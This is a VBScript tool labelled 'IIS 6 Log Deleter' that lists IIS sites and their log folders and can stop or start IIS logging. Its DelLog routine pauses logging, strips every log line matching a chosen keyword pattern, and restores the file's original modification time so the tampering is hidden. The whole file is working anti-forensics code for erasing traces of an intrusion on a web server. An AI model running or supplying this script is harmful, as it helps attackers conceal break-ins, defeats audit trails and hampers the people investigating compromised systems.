If WScript.Arguments.Count < 1 Then
        Usage()
        WScript.Quit(1)
End If

Select Case UCase(WScript.Arguments.Item(0))
        Case "LIST"
                Call ListWeb()
        Case "STOPLOG"
                Call SetLog(WScript.Arguments.Item(1),0) '0 stop log
        Case "STARTLOG"
                Call SetLog(WScript.Arguments.Item(1),1) '1 start log
        Case "DELLOG"
                Call DelLog(WScript.Arguments.Item(1),WScript.Arguments.Item(2),WScript.Arguments.Item(3))
        Case Else
                Call Usage()
End Select

Sub Usage()
        WScript.Echo "IIS 6 Log Deleter   By. Twi1ight" & vbCrLf
        WScript.Echo "Usage:" & vbTab & _
                WScript.ScriptName & " LIST" & vbCrLf & vbTab & _
                WScript.ScriptName & " STARTLOG SiteID" & vbCrLf & vbTab & _
                WScript.ScriptName & " STOPLOG  SiteID" & vbCrLf & vbTab & _
                WScript.ScriptName & " DELLOG   SiteID  LogFile  KeyString" & vbCrLf & "  " & _
                "LIST" & vbTab & vbTab & "List all websites info" & vbCrLf & "  " & _
                "STARTLOG" & vbTab & "Start IIS Logging on SiteID" & vbCrLf & "  " & _
                "STOPLOG" & vbTab & "Stop IIS Logging on SiteID" & vbCrLf & "  " & _
                "DELLOG" & vbTab & "Automatical stop/start IIS log and delete log items which contains KeyString, KeyString is a Regular String"

End Sub

Sub CheckID(ID)
        If Not IsNumeric(ID) Then
                WScript.Echo "[-] The site ID specified is not Numeric"
                WScript.Quit(1)
        End If
End Sub

Sub ListWeb()
        Set ObjService=GetObject("IIS://LocalHost/W3SVC") 
        For Each obj3w In objservice 
                If IsNumeric(obj3w.Name) Then 
                        sServerName=Obj3w.ServerComment 
                        Set webSite = GetObject("IIS://Localhost/W3SVC/" & obj3w.Name & "/Root") 
                        ListAllWeb = ListAllWeb & obj3w.Name & _
                                                String(Abs(25-Len(obj3w.Name))," ") & _
                                                obj3w.ServerComment & "(" & webSite.Path & ")" & vbCrLf
                        Set objLog = GetObject("IIS://Localhost/W3SVC/" & obj3w.Name)
                        ListAllWeb = ListAllWeb & String(25," ") & _
                                                "Log: " & objLog.LogFileDirectory & "\W3SVC" & obj3w.Name &vbCrLf
                End If 
        Next 
        WScript.Echo ListAllWeb 
        Set ObjService=Nothing 
End Sub

Sub SetLog(ID, value)
        CheckID(ID)
        str = "Start"
        If value = 0 Then 
                str = "Stop"
        End If
        Set objSite = GetObject("IIS://localhost/W3SVC/" & ID)
        objSite.Put "LogType",value
        objSite.SetInfo
    If (Err.Number <> 0) Then
                Err.Clear
        WScript.Echo "[-] Error Trying To " & str & " IIS Logging!"
        Else
                WScript.Echo str & " IIS Logging Success!"
    End If
    
End Sub

Sub DelLog(ID, LogFile, KeyString)
        On Error Resume Next
        Const ForReading = 1, ForWriting = 2, ForAppending = 8
        'WScript.Echo "Delete Log File"
        'Stop Log
        Call SetLog(ID, 0)
        WScript.Sleep 500 'wait iis to stop log otherwise will raise an exception if rewrite logfile immediately
        Set regEx = New RegExp
        regEx.Pattern = KeyString
        regEx.IgnoreCase = True
        
        Set fso = CreateObject("Scripting.FileSystemObject")
        'Save Last Modify Time
        Set f = fso.GetFile(LogFile)
        modifyDate = f.DateLastModified
        'WScript.Echo f.DateCreated & " " & f.DateLastAccessed & " " & f.DateLastModified
        
        LogPath = fso.GetParentFolderName(LogFile)
        LogName = fso.GetFileName(LogFile)
        TempFile = fso.GetTempName
        SrcFile = LogPath & "\" & TempFile

        'WScript.Echo TempFile
        Call fso.CopyFile(LogFile, SrcFile)
        Set srcLog = fso.OpenTextFile(SrcFile, ForReading, False)
        Set dstLog = fso.OpenTextFile(LogFile, ForWriting, False)
        Do While srcLog.AtEndOfLine <> True 
                line = srcLog.ReadLine
                Set Martches = regEx.Execute(line)
                If Martches.Count <> 0 Then
                        WScript.Echo " "& line 'comment out this line if don't like to display deleted log item
                Else
                        dstLog.WriteLine(line)
                End If
        Loop
        srcLog.Close
        dstLog.Close
        fso.DeleteFile(SrcFile)
        'Change Last Modify Time
        Set objShell = CreateObject("Shell.Application")
        Set objFolder = objShell.NameSpace(LogPath)
        Set objFolderItem = objFolder.ParseName(LogName)
        objFolderItem.ModifyDate = modifyDate
        'WScript.Echo f.DateCreated & " " & f.DateLastAccessed & " " & f.DateLastModified
    If (Err.Number <> 0) Then
                WScript.Echo "[-] Error Trying To Delete IIS Log!"
                Err.Clear
    End If
        'Start Log
        Call SetLog(ID, 1)
End Sub
